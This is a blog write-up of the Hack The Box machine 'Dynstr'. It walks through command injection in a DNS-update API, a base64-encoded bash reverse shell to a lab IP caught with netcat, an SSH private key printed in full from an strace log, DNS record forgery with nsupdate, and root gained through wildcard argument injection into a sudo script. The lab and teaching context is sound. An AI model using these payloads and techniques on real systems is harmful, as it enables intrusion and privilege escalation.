---
title: "HTB: Dynstr Writeup"
date: 2021-06-17T23:36:00-07:00
categories:
  - blog
  - writeup
  - htb
tags:
  - htb
  - htb medium
  - offsec
---

There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!

---

This is by FAR the most difficult box that I've done on HTB (I haven't done any hard or insane boxes, but this was harder than any other medium box I've done).
# Enumeration
```bash
$ nmap -sC -sV -oA nmap/dynstr 10.129.124.191
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 15:12 EDT
Nmap scan report for 10.129.124.191
Host is up (0.091s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.07 seconds
```

There are a couple things of interest, port 53 (typically DNS stuff) and port 80 hosting an Apache server. I'll check out port 80 first.

## Port 80
There appears to be a single webpage with nothing else of interest from `nikto` or `gobuster`. The website lists the following information

```
Domains:
    dnsalias.htb
    dynamicdns.htb
    no-ip.htb

Login:
    Username: dynadns
    Password: sndanyd
```

The website also says that it uses the same API as no-ip.com and through `gobuster` I located `/nic/update`. Giving that a try, I found that we can update dynamic DNS entries with a curl command like the following

```bash
$ curl -u 'dynadns:sndanyd' 'http://no-ip.htb/nic/update?hostname=test.no-ip.htb'
```

And this is where I was stuck for the LONGEST time! I tried many combinations, locating the longest length of string I could send, trying different credentials, etc. I even tried many MANY fuzzing strings as input, but had little to no progress. The only thing I really noticed was that it seemed to ignore quotes (") when executing.

After a LONG time and a lot of googling, I learned that it's actually executing what is being sent in as a command. For example, this successfully executes:

```bash
$ curl -u 'dynadns:sndanyd' 'http://no-ip.htb/nic/update?hostname=$(echo+"test").no-ip.htb'
```

Using this RCE, we can send ourselves a reverse shell, but because we're dealing with a URL, we need to avoid special characters, so we can do that by base64 encoding the payload (note if the base64 string contains a + character, you can double-base64 encode it or adjust spacing to avoid it).

```bash
$ echo -n 'bash -i &>/dev/tcp/10.10.14.5/9000 <&1' | base64
YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvOTAwMCA8JjE=
$ curl -u 'dynadns:sndanyd' 'http://no-ip.htb/nic/update?hostname=$(echo+"YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvOTAwMCA8JjE="|base64+-d|bash).no-ip.htb'
```

And catching this with a netcat listener

```bash
$ rlwrap nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.244] 53788
bash: cannot set terminal process group (753): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dynstr:/var/www/html/nic$
```

Success! We have a remote shell!

# Privesc - User
Now that we're running as the `www-data` user, we need to move to the regular user.

Firstly, the files `/home/bindmgr/.ssh/id_rsa.pub` and `/home/bindmgr/.ssh/authorized_keys` are readable and contain the same entry, so if we can locate the value in `/home/bindmgr/.ssh/id_rsa` we should be able to login! Unfortunately, there are a few issues with this.
1. The `id_rsa` file is not readable
2. The `authorized_keys` lists that it will only accept connections from `*.infra.dyna.htb`

For the first problem, searching a little bit reveals the file `/home/bindmgr/support-case-C62796521/strace-C62796521.txt` which contains an strace of some command being executed, but within the strace output we see an OpenSSH private key!

```
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
```

Back on our machine, we can store this for later use

```bash
$ echo "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n" > bindmgr
$ chmod 700 bindmgr
```

Now for the second problem of the hostname. We know that this server acts as a dynamic DNS server, so it updates hostnames all the time, but it only allows updating of specific addresses, so lets check to see why this is?

Taking a look at the `/var/www/html/nic/update` file, we see that it's a PHP file:

```php
<?php
  // Check authentication
  if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']))      { echo "badauth\n"; exit; }
  if ($_SERVER['PHP_AUTH_USER'].":".$_SERVER['PHP_AUTH_PW']!=='dynadns:sndanyd') { echo "badauth\n"; exit; }

  // Set $myip from GET, defaulting to REMOTE_ADDR
  $myip = $_SERVER['REMOTE_ADDR'];
  if ($valid=filter_var($_GET['myip'],FILTER_VALIDATE_IP))                       { $myip = $valid; }

  if(isset($_GET['hostname'])) {
    // Check for a valid domain
    list($h,$d) = explode(".",$_GET['hostname'],2);
    $validds = array('dnsalias.htb','dynamicdns.htb','no-ip.htb');
    if(!in_array($d,$validds)) { echo "911 [wrngdom: $d]\n"; exit; }
    // Update DNS entry
    $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
    system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
    // Return good or 911
    if (!$retval) {
      echo "good $myip\n";
    } else {
      echo "911 [nsupdate failed]\n"; exit;
    }
  } else {
    echo "nochg $myip\n";
  }
?>
```

Furthermore, it looks like the hostname restriction is just performed in this PHP file, so if we can bypass the file and directly execute the `nsupdate` command, maybe we can get ourself assigned to a correct domain that is allowed logging in.

It looks like there's a key file referenced in the PHP script called `/etc/bind/ddns.key`, so taking a look at the `/etc/bind` directory, there are a few other interesting files:

```bash
$ ls /etc/bind
...
ddns.key
infra.key
rndc.key
...
```

Since we want a `*.infra.dyna.htb` domain, I bet that `infra.key` file is what we will need to use.

After a bit more googling, I determined that what we need to do is update and create an A record, then assign our ip as a PTR to that record.

```bash
$ nsupdate -k /etc/bind/infra.key
update add api.infra.dyna.htb 86400 A 10.10.14.5

update add 5.14.10.10.in-addr.arpa 86400 PTR api.infra.dyna.htb
show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
5.14.10.10.in-addr.arpa. 86400  IN      PTR     api.infra.dyna.htb.

send
quit
```

Now, back on our machine, we can attempt to log in

```bash
$ ssh -i bindmgr bindmgr@no-ip.htb
bindmgr@dynstr:/tmp/test$
```

Success! We now have user!!

# Privesc - Root
Looking around as the `bindmgr` user, I noticed that we can execute a command with sudo

```bash
$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

So, this `/usr/local/bin/bindmgr.sh` scrip can be executed, looking at the contents we have:

```bash
#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr. 
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else 
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
        systemctl status bind9
    else
        echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi
```

Examining this script, it seems to first check for a `.version` file in your current directory, then if it finds one, it will compare it to `/etc/bind/named.bindmgr/.version`. If the version is higher, it will copy everything from the current directory to `/etc/bind/named.bindmgr/`

The issue with this is the copy command

```bash
cp .version * /etc/bind/named.bindmgr/
```

The `*` here will simply take everything from the current directory and expand it on the CLI, so if we create a file with a name that is actually a CLI argument for `cp`, that will get expanded and become an argument rather than a file. We can use this to our advantage to preserve permissions on a file that is being copied.

```bash
$ cd /tmp
$ echo 1 > .version
$ cp /bin/bash .
$ chmod +s bash
$ echo > '--preserve=mode'
```

This will expand to the following command

```bash
$ cp .version --preserve=mode bash /etc/bind/named.bindmgr/
```

And since we used `chmod +s bash`, the resulting file will be owned by `root` and will have the SUID bit set, allowing it to be executed as root. Using the following, we will execute this and make the copy.

```bash
$ sudo /usr/local/bin/bindmgr.sh
```

Now we should have a `bash` as root with the SUID bit set

```bash
$ ls -larth /etc/bind/named.bindmgr
total 1.2M
-rw-rw-r-- 1 root bind    2 Jun 18 08:30 .version
-rwsr-sr-x 1 root bind 1.2M Jun 18 08:30 bash
drwxr-sr-x 3 root bind 4.0K Jun 18 08:30 ..
drwxr-sr-x 2 root bind 4.0K Jun 18 08:30 .
```

Great! Lets give it a try and execute this bash, but before we do we must look at the bash manual, specifically this portion:

> If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not  inherited  from  the  environment,  the SHELLOPTS,  BASHOPTS,  CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.

So, if we just execute the bash, it will detect that the effective user (`root`) differs from the real user (`bindmgr`) and will set the effective user to the real user, causing it to execute as `bindmgr` and not `root`. So we need to pass the `-p` option to prevent this from happening.

```bash
$ /etc/bind/named.bindmgr/bash -p
bash-5.0# whoami
root
bash-5.0#
```

Success!!!! We are now root!
